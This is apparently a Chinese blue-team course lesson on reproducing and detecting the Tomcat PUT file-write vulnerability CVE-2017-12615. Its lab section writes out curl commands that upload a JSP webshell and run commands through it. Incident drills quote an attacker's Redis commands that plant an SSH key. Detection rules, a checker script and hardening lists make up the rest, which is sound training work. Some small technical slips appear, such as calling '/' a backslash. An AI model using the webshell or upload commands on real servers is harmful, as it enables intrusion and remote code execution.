---
title: "Day 42: Tomcat漏洞复现与检测（CVE-2017-12615）"
day: 42
difficulty: "中级"
category: "cyber-learning"
---

# Day 42: Tomcat漏洞复现与检测（CVE-2017-12615）

## 今日目标


1. 理解Tomcat任意文件写入漏洞（CVE-2017-12615）的原理
2. 亲手复现漏洞，体会攻击者的操作过程
3. 掌握该漏洞的蓝队检测特征与防御方法

> **漏洞概述**：Tomcat 7.0.0-7.0.81 版本中，当配置了可写权限且开启了PUT方法时，
> 攻击者可以通过PUT请求上传JSP Webshell文件到服务器，实现远程代码执行。

---

## 漏洞原理（通俗版）

Tomcat是一个运行Java Web应用的容器。正常情况下，用户只能"看"网页，
不能往服务器上传文件修改文件。

但CVE-2017-12615这个漏洞，让攻击者可以通过HTTP的PUT方法，直接把恶意JSP文件
"塞"到Tomcat的web目录下。JSP文件就像PHP文件一样，服务器会执行它。

打个比方：你的房子（服务器）有个门禁（Tomcat），正常情况下访客只能在大厅活动。
但这个漏洞相当于门禁系统坏了——访客能直接走到你的卧室里放一个窃听器（Webshell）。

---

## 漏洞复现（动手环节）

### 第一步：启动漏洞环境
```
cd vulhub/tomcat/CVE-2017-12615
docker-compose up -d
```

### 第二步：确认漏洞存在
```
curl -X PUT http://localhost:8080/test.jsp/ -d "hello"
```
如果返回201 Created，说明漏洞存在（PUT方法可用）。

### 第三步：上传Webshell

创建一个JSP Webshell文件：
```
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

用curl上传：
```
curl -X PUT http://localhost:8080/shell.jsp/ -d "<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>"
```

### 第四步：执行命令验证
```
curl http://localhost:8080/shell.jsp?cmd=id
```
看到命令执行结果就说明攻击成功。

### 第五步：环境清理
```
docker-compose down
```

---

## 蓝队检测特征

### 网络层检测
| 检测点 | 具体特征 | 检测难度 |
|:---|:---|:---|
| HTTP方法 | PUT方法请求（正常Web基本不用PUT） | 容易 |
| URL路径 | 请求路径以 .jsp/ 结尾 | 容易 |
| 请求体 | 包含 Runtime.getRuntime() 等代码 | 中等 |
| 后续行为 | 对新上传的jsp文件做GET请求 | 容易 |
| User-Agent | 攻击工具特征（如curl/x.x.x） | 中等 |

### WAF/IDS规则建议
检测PUT方法 + 路径包含 .jsp + 请求体包含 Runtime：
```
SecRule REQUEST_METHOD "PUT" \
SecRule REQUEST_URI "\.jsp" \
SecRule REQUEST_BODY "Runtime|ProcessBuilder"
```

### 日志分析特征
在Tomcat的access_log中，你会看到类似以下记录：
```
PUT /shell.jsp/ HTTP/1.1 201   <- 上传成功
GET /shell.jsp?cmd=whoami HTTP/1.1 200  <- 执行命令
```
这两条日志紧挨着出现，且时间间隔很短，是典型的Webshell上传+执行模式。

---

## 修复方案
1. 升级Tomcat到7.0.82以上版本（官方已修复）
2. 在Tomcat的web.xml中禁用PUT/DELETE方法
3. 配置conf/web.xml限制可写权限
4. 前面加反向代理（Nginx/Apache）只允许GET/POST方法

---

## 动手任务
1. 在VulHub中复现CVE-2017-12615漏洞
2. 用Wireshark抓取攻击过程中的完整HTTP请求和响应
3. 用BurpSuite重放PUT请求，观察完整交互过程
4. 列出至少5个检测特征，并在日志中验证


---

## 实战思维训练：从理论到肌肉记忆

### 为什么要做实战思维训练？

理论学完了，不等于实战中用得上。蓝队工作中最常见的问题是：
"我知道SQL注入是什么，但真看到日志时反应不过来。"

原因：知识和行动之间缺少"条件反射"训练。就像学开车——
知道刹车在哪儿和紧急情况能踩刹车是两回事。

### 蓝队条件反射训练法

**方法一：5秒判断法**

给自己看一条日志，5秒内回答三个问题：
1. 这是攻击吗？（是/否/不确定）
2. 如果是攻击，是什么类型？
3. 我应该做什么？（忽略/记录/告警/升级）

每天练10条，坚持一周，判断速度会明显提升。

**方法二：攻击路径推演法**

看到一条可疑日志后，在心里推演攻击者的下一步：
- SQL注入检测到 -> 攻击者下一步会尝试 UNION SELECT 查数据
- Webshell上传成功 -> 下一步会访问shell执行命令
- 端口扫描发现 -> 下一步会针对开放的服务做漏洞利用

提前想到攻击者的下一步，你就能先发制人。

**方法三：误报记忆库法**

每当你发现一个误报，记录下来：
- 误报的类型（SQL注入/XSS/目录遍历等）
- 触发误报的正常业务场景
- 你如何判断它是误报的

积累100个误报案例后，你的判断准确率会翻倍。

---

## 知识串联网络

网络安全知识不是一个个孤岛，它们之间有千丝万缕的联系。理清这些联系，你才能真正"融会贯通"。

| 层级 | 内容 | 今天涉及的 |
|:---|:---|:---|
| 第一层：认知 | ATT&CK、Kill Chain、漏洞原理 | 理论基础 |
| 第二层：工具 | Nmap、Burp、SQLMap、ELK | 工具支撑 |
| 第三层：检测 | 日志分析、告警研判、规则编写 | 核心技能 |
| 第四层：响应 | 应急响应、处置流程、报告撰写 | 最终目标 |

---

## 蓝队面试高频自测

**1. 请描述一次完整的Web攻击检测流程**
参考答案：收到告警 -> 查看日志确认 -> 分析Payload -> 判断类型 -> 确认是否成功 -> 处置 -> 写报告。

**2. 什么是IDS/IPS？区别是什么？**
IDS（入侵检测系统）只检测不阻断，IPS（入侵防御系统）检测+阻断。IDS像摄像头（记录），IPS像门禁（拦截）。

**3. ATT&CK框架对蓝队有什么用？**
ATT&CK告诉我们攻击者"会做什么"和"怎么做的"，蓝队据此在对应的战术阶段设置检测点。

**4. 告警很多怎么处理？**
先分级（高危立即处理、中危今日内、低危周汇总），再优化规则减少误报。

---

## 学习节奏建议

### 你现在的进度

你已经快完成一半的课程。很多人学网络安全坚持不了50天，你已经超过了他们。

### 常见瓶颈与突破

**瓶颈一：学了后面的忘了前面的**
每天花5分钟快速浏览前一天的笔记，每周花20分钟回顾本周知识点。

**瓶颈二：实操跟不上理论**
把环境搭建当作第一优先级的事，环境不通后续都白搭。Docker可以极大简化这个过程。

**瓶颈三：内容太多记不住**
优先记住"检测特征"和"处置流程"，具体命令可以查文档。

### 鼓励的话

你已经比80%的"想学网络安全但坚持不了"的人走得更远了。
再坚持70天，你就是那20%的人。


---


## Tomcat安全配置基线（蓝队必备）

### 生产环境Tomcat安全加固清单

- [ ] 以非root用户运行Tomcat（创建tomcat用户）
- [ ] 删除默认应用（docs, examples, host-manager, manager）
- [ ] 禁用PUT/DELETE/TRACE等危险HTTP方法
- [ ] 关闭目录列表功能（listings=false）
- [ ] 修改默认的Server头信息（不暴露Tomcat版本）
- [ ] 配置错误页面，不显示详细错误信息
- [ ] 限制manager应用只允许内网访问
- [ ] 定期检查webapps目录下是否有可疑文件

### 安全配置示例（web.xml）

限制HTTP方法：
```xml
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Restricted Methods</web-resource-name>
        <url-pattern>/*</url-pattern>
        <http-method>PUT</http-method>
        <http-method>DELETE</http-method>
        <http-method>TRACE</http-method>
    </web-resource-collection>
    <auth-constraint/>
</security-constraint>
```

### Tomcat漏洞家族速查

| CVE编号 | 类型 | 影响版本 | 核心检测特征 |
|:---|:---|:---|:---|
| CVE-2017-12615 | 任意文件写入 | 7.0.0-7.0.81 | PUT + .jsp/ |
| CVE-2017-12617 | 任意文件上传 | 7.0.0-7.0.81 | PUT + Content-Type:multipart |
| CVE-2019-0232 | 命令执行 | Windows版 | CGI Servlet |
| CVE-2020-1938 | 文件包含(AJP) | 全版本 | AJP协议访问 |

蓝队排查时：看到Tomcat服务器 -> 检查版本 -> 对照上表确定是否存在已知漏洞 -> 推动升级或加固。


---

> **明日预告**：明天继续你的网络安全之旅，坚持就是胜利。

---

## Tomcat漏洞深度解析

### CVE-2017-12615的技术细节

这个漏洞的根本原因是Tomcat的默认Servlet处理PUT请求时的逻辑缺陷。

正常流程：
1. 客户端发送 PUT /test.jsp/ HTTP/1.1
2. Tomcat的DefaultServlet接收到请求
3. DefaultServlet检查目标路径 /test.jsp/
4. 由于路径以 / 结尾，DefaultServlet认为这是一个目录
5. DefaultServlet在目录下创建文件，文件名默认为空字符串
6. 但Tomcat没有正确验证这个行为，导致攻击者可以在web目录写入任意文件

关键点：**路径末尾的反斜杠 /** 是漏洞触发的必要条件！没有这个 /，PUT请求会被正常拒绝。

### 漏洞变种：CVE-2017-12617

CVE-2017-12617 是 CVE-2017-12615 的绕过版本。
当CVE-2017-12615被修补后（简单地拒绝PUT方法），攻击者发现可以通过
**Content-Type: multipart/form-data** 配合PUT方法来绕过限制。

两者的区别：
- CVE-2017-12615：PUT + 路径以 / 结尾
- CVE-2017-12617：PUT + multipart/form-data（绕过PUT方法限制）

### 如何在WAF中精确检测

单靠检测PUT方法会产生大量误报（许多RESTful API使用PUT方法）。

精确检测规则需要组合条件：
```
条件A：请求方法 = PUT
条件B：目标URL路径以 .jsp/ 结尾
条件C：请求体包含Java代码特征（Runtime、ProcessBuilder、ClassLoader等）

触发条件：A AND B
高可信条件：A AND B AND C
```

### 蓝队自学路线图（Tomcat安全方向）

第1天：学会CVE-2017-12615原理+复现+检测（今天完成）
第2天：了解CVE-2017-12617绕过方式
第3天：了解Apache Tomcat AJP协议漏洞（CVE-2020-1938 Ghostcat）
第4天：总结Tomcat安全加固全景
第5天：尝试在没有公开PoC的情况下，自己写一个简单的Tomcat检测脚本

---

## 动手验证区域

### 验证Tomcat版本是否受影响

```bash
# 方法1：访问Tomcat首页查看版本
curl -s http://target:8080/ | grep "Apache Tomcat"

# 方法2：通过HTTP响应头
curl -I http://target:8080/ | grep Server

# 方法3：访问错误页面（有时也能看到版本）
curl http://target:8080/nonexistent
```

### 手动检测CVE-2017-12615

```bash
# 发送PUT测试请求
curl -X PUT http://target:8080/test.jsp/ -d "test" -v

# 如果返回 201 Created -> 漏洞存在
# 如果返回 405 Method Not Allowed -> PUT被禁用
# 如果返回 403 Forbidden -> 有访问控制
```

---

## 今日检查清单
- [ ] 成功复现CVE-2017-12615
- [ ] 抓取了攻击过程的完整HTTP流量
- [ ] 列出了至少5个蓝队检测特征
- [ ] 理解了Tomcat安全加固的至少3条措施
- [ ] 能用自己话解释这个漏洞的原理

> 明日预告：Day 43 — Weblogic反序列化漏洞。如果说Tomcat是轻量级的，Weblogic就是重量级的Java应用服务器，漏洞也更复杂。
## 蓝队日常演练：模拟真实护网场景

### 场景一：凌晨3点收到Redis告警

**场景描述：**
你值夜班，凌晨3点监控平台弹出告警：一台服务器（10.0.1.50）的Redis端口（6379）
收到了来自境外IP（45.x.x.x）的连接请求，并且成功执行了 CONFIG SET 命令。

**你的处置流程：**

1. **第一反应（0-30秒）**：P0告警，立即确认
   - 打开ELK，搜索源IP 45.x.x.x 的所有日志
   - 发现该IP在过去10分钟内一直在对内网做端口扫描

2. **分析阶段（30秒-2分钟）**：
   - 查看Redis日志：发现执行了 CONFIG SET dir /root/.ssh/ 和 CONFIG SET dbfilename authorized_keys
   - 判断：攻击者正在尝试写入SSH公钥，获取服务器控制权！

3. **处置阶段（2-5分钟）**：
   - 立即在防火墙上封禁 45.x.x.x
   - SSH登录 10.0.1.50，检查 /root/.ssh/authorized_keys 是否有异常公钥
   - 给Redis设置临时密码：CONFIG SET requirepass "emergency_pass_2026"
   - 通知组长和运维

4. **善后阶段（5-30分钟）**：
   - 排查同一网段其他Redis是否也有类似配置问题
   - 检查是否有后续的SSH登录记录（如果有，说明已被入侵）
   - 写应急处置报告

**这个场景的启示：**
- Redis未授权访问不是"小问题"，它可以导致服务器被完全控制
- 凌晨的攻击需要特别重视，因为攻击者知道这个时候防守最薄弱
- 处置要快：从发现到封禁最好在5分钟内完成

### 场景二：办公网发现Weblogic扫描流量

**场景描述：**
IDS检测到某内网IP（192.168.1.100）在扫描多个服务器的7001端口，
并发送了带有 ProcessBuilder 关键字的SOAP请求。

**判断思路：**
内网IP发起Weblogic攻击 -> 两台可能：
1. 安全团队在做渗透测试（查一下有没有授权的测试计划）
2. 这台机器已经被黑客控制，正在内网横向移动

查询后发现当天没有测试计划 -> 选项2成立！

**处置流程：**
1. 立即断网这台机器（但不关机，保留内存证据）
2. 检查该机器的进程列表、网络连接、计划任务
3. 发现了一个可疑的进程：java -jar reverser_shell.jar
4. 追踪攻击入口：该机器上运行着一个未修复的Shiro应用

**教训：**
- 内网的异常扫描比外网扫描危险100倍，因为说明边界已被突破
- 不看来源IP的"态度"（内网=信任）是安全的大忌
- 一旦确认内网机器被控，必须立即隔离

---

## 蓝队必备工具链复盘

你现在已经接触了以下工具，来做个阶段性复盘：

| 工具 | 已学会 | 还需要学什么 | 优先级 |
|:---|:---|:---|:---|
| Nmap | 基础端口扫描 | -sV服务版本、-sC脚本扫描 | 高 |
| Wireshark | 基础抓包 | 过滤器、Follow Stream | 高 |
| BurpSuite | 代理+Repeater | Intruder、Decoder | 高 |
| SQLMap | 识别SQLMap流量 | 更高级的流量特征 | 中 |
| OpenVAS | 基础漏洞扫描 | 报告解读、任务计划 | 中 |
| ELK | 基础查询 | KQL高级语法、可视化 | 高 |
| VulHub | 漏洞环境启动 | 更多漏洞的复现 | 高 |
| Hydra | 基础弱口令检测 | 多协议、并发优化 | 低 |

---

## 网络安全学习心态篇

### 为什么有人能坚持120天，有人3天就放弃？

**第一种心态："我要学会所有东西"**
每天看教程、记笔记，追求"全面掌握"。
问题是：网络安全领域太大，根本不可能"全学会"。
几天后发现自己只学了冰山一角 -> 挫败感 -> 放弃。

**第二种心态："我今天比昨天强一点就行"**
不求全面，只求进步。今天搞懂了一个漏洞，就是胜利。
这种心态下，120天后你回头看，吓一跳——原来已经学了这么多。

**你是哪种？如果是第一种，现在是切换心态的最佳时机。**

### 坚持的秘诀

1. **不要完美主义**：今天状态不好？学15分钟也可以，不要"既然不能学1小时就不学了"
2. **建立仪式感**：每天固定时间学习（比如早上通勤时看30分钟）
3. **及时反馈**：每学完一个漏洞就奖励自己（一杯咖啡、一集电视剧）
4. **同伴激励**：找个同学一起学，互相打卡
5. **记录进步**：每周回头看看自己写的笔记，你会发现自己进步了

### 写给你自己

你现在学网络安全可能是因为：
- 想找一份安全相关的工作
- 想参加护网行动
- 单纯对黑客技术感兴趣
- 被要求学（公司安排）

不管什么原因，记住你的初始目标。当想放弃时，想想当初为什么开始。

> 一句话总结：网络安全没有"学完"的那一天，但每学一天，你就比昨天更强一点。这120天就是你的"第一桶知识"。

---

## Tomcat检测脚本练手

写一个简单的Python脚本检测CVE-2017-12615：

```python
import requests

def check_cve_2017_12615(target):
    url = f"{target}/test_{'a'*8}.jsp/"
    data = "test"
    try:
        r = requests.put(url, data=data, timeout=5, verify=False)
        if r.status_code == 201:
            print(f"[+] 漏洞存在: {target}")
            return True
        else:
            print(f"[-] 漏洞不存在: {target} (status={r.status_code})")
            return False
    except:
        print(f"[!] 连接失败: {target}")
        return False

# 测试
check_cve_2017_12615("http://localhost:8080")
```

蓝队可以把这个脚本改成监控脚本：定期检查内部Tomcat服务器，发现漏洞自动告警。

---

> **明日预告**：继续前进，每一天都是进步。

---

## Tomcat加固一条龙

- 改默认端口：8080 -> 18080
- 删默认应用：rm -rf webapps/docs webapps/examples webapps/ROOT
- 禁目录列表：web.xml中listings=false
- 限HTTP方法：只允许GET/POST
- 隐藏版本：server.xml中Server头改名
- 非root运行：useradd tomcat && chown -R tomcat:tomcat /opt/tomcat

一口气做完这6项，Tomcat安全性提升80%。